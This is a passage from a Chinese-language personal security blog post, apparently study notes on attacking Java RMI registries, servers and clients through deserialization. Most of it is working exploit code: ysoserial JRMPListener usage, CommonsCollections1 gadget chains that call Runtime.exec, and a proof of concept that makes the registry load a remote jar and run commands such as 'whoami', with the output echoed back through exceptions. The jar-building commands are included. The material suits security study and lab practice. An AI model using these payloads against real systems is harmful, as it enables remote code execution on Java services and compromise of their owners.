<li>lookup<br>在这其中unbind和rebind都会返回数据给客户端,返回的形式是序列化的形式,那么客户端就只能使用反序列化来获取,如果我们能控制返回的数据这样就可以进行攻击了.这里使用的是ysoserial的JRMPListener,命令如下:<br><code>java -cp .\ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 calc</code><br>不用加单引号<br><img src="/posts/67304d02/20251231155929605.png" alt="image.png"></li>
</ul>
<h3 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h3><p>服务端攻击客户端可以利用的点分为两种:</p>
<ol>
<li>服务端返回对象</li>
<li>远程加载对象</li>
</ol>
<h4 id="服务端返回对象"><a href="#服务端返回对象" class="headerlink" title="服务端返回对象"></a>服务端返回对象</h4><p>在RMI中，远程调用方法传递回来的不一定是一个基础数据类型（String、int），也有可能是对象，当服务端返回给客户端一个对象时，客户端就要对应的进行反序列化。所以我们需要伪造一个服务端，当客户端调用某个远程方法时，返回的参数是我们构造好的恶意对象。这里以CC1为例：<br>User接口:</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.Remote;  </span><br><span class="line">  </span><br><span class="line">public interface User extends Remote {  </span><br><span class="line">    public Object getUser() throws Exception;  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>接口实现类</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line">import java.lang.annotation.Target;  </span><br><span class="line">import java.lang.reflect.Constructor;  </span><br><span class="line">import java.lang.reflect.InvocationTargetException;  </span><br><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.rmi.server.UnicastRemoteObject;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">public class RemoteOBJ extends UnicastRemoteObject implements User{  </span><br><span class="line">    public RemoteOBJ() throws RemoteException {  </span><br><span class="line">        //UnicastRemoteObject.exportObject(this,0);如果不继承UnicastRemoteObject就需要手动导出  </span><br><span class="line">    }  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    public Object getUser() throws RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {  </span><br><span class="line">        Transformer[] t = new Transformer[]{  </span><br><span class="line">                new ConstantTransformer(Runtime.class),  </span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  </span><br><span class="line">                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  </span><br><span class="line">                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  </span><br><span class="line">        };  </span><br><span class="line">        ChainedTransformer chainedtransformer = new ChainedTransformer(t);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">        map.put("value", "value"); // Key 必须是 "value"，因为 Target 注解中有 value() 方法  </span><br><span class="line">        Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(map, null, chainedtransformer);  </span><br><span class="line">  </span><br><span class="line">        // 获取 AnnotationInvocationHandler 的构造器  </span><br><span class="line">        Class&lt;?&gt; cc = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  </span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = cc.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">        declaredConstructor.setAccessible(true);  </span><br><span class="line">  </span><br><span class="line">        // 实例化 Handler        Object o = declaredConstructor.newInstance(Target.class, decorate);  </span><br><span class="line">  </span><br><span class="line">        return o;  </span><br><span class="line">  </span><br><span class="line">    }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>绑定到服务端</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.NotBoundException;  </span><br><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.rmi.registry.LocateRegistry;  </span><br><span class="line">import java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line">public class RMIclient {  </span><br><span class="line">    public static void main(String[] args) throws Exception {  </span><br><span class="line">        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);  </span><br><span class="line">        User rmiserver = (User)registry.lookup("rmiserver");  </span><br><span class="line">        rmiserver.getUser();  </span><br><span class="line">    }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>客户端的调用</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java.rmi.NotBoundException;  </span><br><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.rmi.registry.LocateRegistry;  </span><br><span class="line">import java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line">public class RMIclient {  </span><br><span class="line">    public static void main(String[] args) throws Exception {  </span><br><span class="line">        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);  </span><br><span class="line">        User rmiserver = (User)registry.lookup("rmiserver");  </span><br><span class="line">        rmiserver.getUser();  </span><br><span class="line">    }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p><img src="/posts/67304d02/20251231161637254.png" alt="image.png"></p>
<h4 id="加载远程对象"><a href="#加载远程对象" class="headerlink" title="加载远程对象"></a>加载远程对象</h4><p>大家可以找p神的文章看一下,具体实现的条件有点苛刻,我就没细看</p>
<h2 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h2><h3 id="客户端打服务端"><a href="#客户端打服务端" class="headerlink" title="客户端打服务端"></a>客户端打服务端</h3><p>服务端实现类</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line">import java.lang.annotation.Target;  </span><br><span class="line">import java.lang.reflect.Constructor;  </span><br><span class="line">import java.lang.reflect.InvocationTargetException;  </span><br><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.rmi.server.UnicastRemoteObject;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">public class RemoteOBJ extends UnicastRemoteObject implements User{  </span><br><span class="line">    public RemoteOBJ() throws RemoteException {  </span><br><span class="line">        //UnicastRemoteObject.exportObject(this,0);如果不继承UnicastRemoteObject就需要手动导出  </span><br><span class="line">    }  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    public void getUser(Object o) throws RemoteException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException {  </span><br><span class="line">        System.out.println("getUser");  </span><br><span class="line">    }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>客户端的</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;  </span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;  </span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;  </span><br><span class="line">  </span><br><span class="line">import java.lang.annotation.Target;  </span><br><span class="line">import java.lang.reflect.Constructor;  </span><br><span class="line">import java.rmi.NotBoundException;  </span><br><span class="line">import java.rmi.Remote;  </span><br><span class="line">import java.rmi.RemoteException;  </span><br><span class="line">import java.rmi.registry.LocateRegistry;  </span><br><span class="line">import java.rmi.registry.Registry;  </span><br><span class="line">import java.util.HashMap;  </span><br><span class="line">import java.util.Map;  </span><br><span class="line">  </span><br><span class="line">public class RMIclient {  </span><br><span class="line">    public static void main(String[] args) throws Exception {  </span><br><span class="line">        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);  </span><br><span class="line">        User rmiserver = (User)registry.lookup("rmiserver");  </span><br><span class="line">        rmiserver.getUser(payload());  </span><br><span class="line">    }  </span><br><span class="line">  </span><br><span class="line">    public static Object payload() throws Exception {  </span><br><span class="line">        Transformer[] t = new Transformer[]{  </span><br><span class="line">                new ConstantTransformer(Runtime.class),  </span><br><span class="line">                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  </span><br><span class="line">                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  </span><br><span class="line">                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  </span><br><span class="line">        };  </span><br><span class="line">        ChainedTransformer chainedtransformer = new ChainedTransformer(t);  </span><br><span class="line">  </span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();  </span><br><span class="line">        map.put("value", "value"); // Key 必须是 "value"，因为 Target 注解中有 value() 方法  </span><br><span class="line">        Map&lt;Object, Object&gt; decorate = TransformedMap.decorate(map, null, chainedtransformer);  </span><br><span class="line">  </span><br><span class="line">        // 获取 AnnotationInvocationHandler 的构造器  </span><br><span class="line">        Class&lt;?&gt; cc = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  </span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = cc.getDeclaredConstructor(Class.class, Map.class);  </span><br><span class="line">        declaredConstructor.setAccessible(true);  </span><br><span class="line">  </span><br><span class="line">        // 实例化 Handler        Object o = declaredConstructor.newInstance(Target.class, decorate);  </span><br><span class="line">  </span><br><span class="line">        return o;  </span><br><span class="line">    }  </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>记得改接口,就是利用传的参数是一个恶意类<br><img src="/posts/67304d02/20251231163059954.png" alt="image.png"></p>
<h3 id="加载远程对象-1"><a href="#加载远程对象-1" class="headerlink" title="加载远程对象"></a>加载远程对象</h3><p>和上述一样.<a target="_blank" rel="noopener" href="https://paper.seebug.org/1091/">Java 中 RMI、JNDI、LDAP、JRMP、JMX、JMS那些事儿（上）</a></p>
<h1 id="RMI的进阶攻击方式"><a href="#RMI的进阶攻击方式" class="headerlink" title="RMI的进阶攻击方式"></a>RMI的进阶攻击方式</h1><p>攻击注册中心时，注册中心遇到异常会直接把异常发回来，返回给客户端。这里我们利用URLClassLoader加载远程jar，传入服务端，反序列化后调用其方法，在方法内抛出错误，错误会传回客户端,这样也就得到了命令执行的回显<br>远程demo：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"> </span><br><span class="line">public class ErrorBaseExec {</span><br><span class="line"> </span><br><span class="line">    public static void do_exec(String args) throws Exception</span><br><span class="line">    {</span><br><span class="line">        Process proc = Runtime.getRuntime().exec(args);</span><br><span class="line">        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));</span><br><span class="line">        StringBuffer sb = new StringBuffer();</span><br><span class="line">        String line;</span><br><span class="line">        while ((line = br.readLine()) != null)</span><br><span class="line">        {</span><br><span class="line">            sb.append(line).append("\n");</span><br><span class="line">        }</span><br><span class="line">        String result = sb.toString();</span><br><span class="line">        Exception e=new Exception(result);</span><br><span class="line">        throw e;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<p>制作jar包的命令</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac ErrorBaseExec.java</span><br><span class="line">jar -cvf RMIexploit.jar ErrorBaseExec.class</span><br></pre></td></tr></tbody></table></figure>
<p>客户端的poc</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"> </span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line"> </span><br><span class="line">import java.net.URLClassLoader;</span><br><span class="line"> </span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line">import java.rmi.registry.Registry;</span><br><span class="line"> </span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">public class Client {</span><br><span class="line">    public static Constructor&lt;?&gt; getFirstCtor(final String name)</span><br><span class="line">            throws Exception {</span><br><span class="line">        final Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[0];</span><br><span class="line">        ctor.setAccessible(true);</span><br><span class="line"> </span><br><span class="line">        return ctor;</span><br><span class="line">    }</span><br><span class="line"> </span><br><span class="line">    public static void main(String[] args) throws Exception {</span><br><span class="line">        String ip = "127.0.0.1"; //注册中心ip</span><br><span class="line">        int port = 1099; //注册中心端口</span><br><span class="line">        String remotejar = 远程jar;</span><br><span class="line">        String command = "whoami";</span><br><span class="line">        final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";</span><br><span class="line"> </span><br><span class="line">        try {</span><br><span class="line">            final Transformer[] transformers = new Transformer[] {</span><br><span class="line">                    new ConstantTransformer(java.net.URLClassLoader.class),</span><br><span class="line">                    new InvokerTransformer("getConstructor",</span><br><span class="line">                            new Class[] { Class[].class },</span><br><span class="line">                            new Object[] { new Class[] { java.net.URL[].class } }),</span><br><span class="line">                    new InvokerTransformer("newInstance",</span><br><span class="line">                            new Class[] { Object[].class },</span><br><span class="line">                            new Object[] {</span><br><span class="line">                                    new Object[] {</span><br><span class="line">                                            new java.net.URL[] { new java.net.URL(remotejar) }</span><br><span class="line">                                    }</span><br><span class="line">                            }),</span><br><span class="line">                    new InvokerTransformer("loadClass",</span><br><span class="line">                            new Class[] { String.class },</span><br><span class="line">                            new Object[] { "ErrorBaseExec" }),</span><br><span class="line">                    new InvokerTransformer("getMethod",</span><br><span class="line">                            new Class[] { String.class, Class[].class },</span><br><span class="line">                            new Object[] { "do_exec", new Class[] { String.class } }),</span><br><span class="line">                    new InvokerTransformer("invoke",</span><br><span class="line">                            new Class[] { Object.class, Object[].class },</span><br><span class="line">                            new Object[] { null, new String[] { command } })</span><br><span class="line">            };</span><br><span class="line">            Transformer transformedChain = new ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = new HashMap();</span><br><span class="line">            innerMap.put("value", "value");</span><br><span class="line"> </span><br><span class="line">            Map outerMap = TransformedMap.decorate(innerMap, null,</span><br><span class="line">                    transformedChain);</span><br><span class="line">            Class cl = Class.forName(</span><br><span class="line">                    "sun.reflect.annotation.AnnotationInvocationHandler");</span><br><span class="line">            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">            ctor.setAccessible(true);</span><br><span class="line"> </span><br><span class="line">            Object instance = ctor.newInstance(Target.class, outerMap);</span><br><span class="line">            Registry registry = LocateRegistry.getRegistry(ip, port);</span><br><span class="line">            InvocationHandler h = (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS)</span><br><span class="line">                    .newInstance(Target.class,</span><br><span class="line">                            outerMap);</span><br><span class="line">            Remote r = Remote.class.cast(Proxy.newProxyInstance(</span><br><span class="line">                    Remote.class.getClassLoader(),</span><br><span class="line">                    new Class[] { Remote.class }, h));</span><br><span class="line">            registry.bind("liming", r);</span><br><span class="line">        } catch (Exception e) {</span><br><span class="line">            try {</span><br><span class="line">                System.out.print(e.getCause().getCause().getCause().getMessage());</span><br><span class="line">            } catch (Exception ee) {</span><br><span class="line">                throw e;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>编译的java环境要一样哈<br><img src="/posts/67304d02/20251231165538984.png" alt="image.png"></p>
<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>RMI就到此结束了</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lxu2n.github.io">红烧花园宝宝</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lxu2n.github.io/posts/67304d02/">https://lxu2n.github.io/posts/67304d02/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://lxu2n.github.io" target="_blank">红烧花园宝宝</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/image/1.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/3dd769b8/" title="moectf2025_第23关"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">moectf2025_第23关</div></div><div class="info-2"><div class="info-item-1">moectf 2025 第23关常规做法直接给出exp吧，挺有意思的，感觉写的没问题（但是没反弹成功），本地的calc，也正常执行了（虽然反序列化前会执行一次） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192import com.example.demo.Dog.Dog;  import com.example.demo.Dog.DogService;    import java.io.*;  import java.lang.reflect.Field;  import java.lang.reflect.InvocationTargetException;  import java.lang.reflect.Method;  import java.util.Base64; ...</div></div></div></a><a class="pagination-related" href="/posts/fe391cb8/" title="RMI_1"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">RMI_1</div></div><div class="info-2"><div class="info-item-1">前言今日开始java中RMI的学习先记录一下RMI的坑点：RMI攻击手法只能在jdk8u121之前可以使用，因为在8u121之后bind rebind unbind这三个方法只能对localhost进行攻击 环境准备 jdk8u65  RMI基础RMI介绍RMI (Remote Method Invocation) 模型是一种分布式对象应用，使用 RMI 技术可以使一个 JVM 中的对象，调用另一个 JVM 中的对象方法并获取调用结果。这里的另一个 JVM 可以在同一台计算机也可以是远程计算机。因此，RMI 意味着需要一个 Server 端和一个 Client 端。 Server 端通常会创建一个对象，并使之可以被远程访问。 这个对象被称为远程对象。Server 端需要注册这个对象可以被 Client 远程访问。 Client 端调用可以被远程访问的对象上的方法，Client 端就可以和 Server 端进行通信并相互传递信息。 说到这里，是不是发现使用 RMI 在构建一个分布式应用时十分方便，它和 RPC 一样可以实现分布式应用之间的互相通信，甚至和现在的微服务思想都十分类似。...</div></div></div></a></nav><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/image/1.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info-name">红烧花园宝宝</div><div class="author-info-description">生命只有一次,我只能爱你一世</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">53</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/LXu2n/LXu2n.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RMI%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">2.</span> <span class="toc-text">RMI的基本攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BBRMI-registry"><span class="toc-number">2.1.</span> <span class="toc-text">攻击RMI registry</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8list%E6%96%B9%E6%B3%95%E4%BA%A4%E4%BA%92"><span class="toc-number">2.1.1.</span> <span class="toc-text">使用list方法交互</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8bind%E6%88%96rebind%E8%BF%9B%E8%A1%8C%E4%BA%A4%E4%BA%92"><span class="toc-number">2.1.2.</span> <span class="toc-text">使用bind或rebind进行交互</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8unbind%E5%92%8Cuplook%E8%BF%9B%E8%A1%8C%E4%BA%A4%E4%BA%92"><span class="toc-number">2.1.3.</span> <span class="toc-text">使用unbind和uplook进行交互</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">2.2.</span> <span class="toc-text">攻击客户端</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">2.2.1.</span> <span class="toc-text">注册中心攻击客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">2.2.2.</span> <span class="toc-text">服务端攻击客户端</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%BF%94%E5%9B%9E%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">服务端返回对象</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 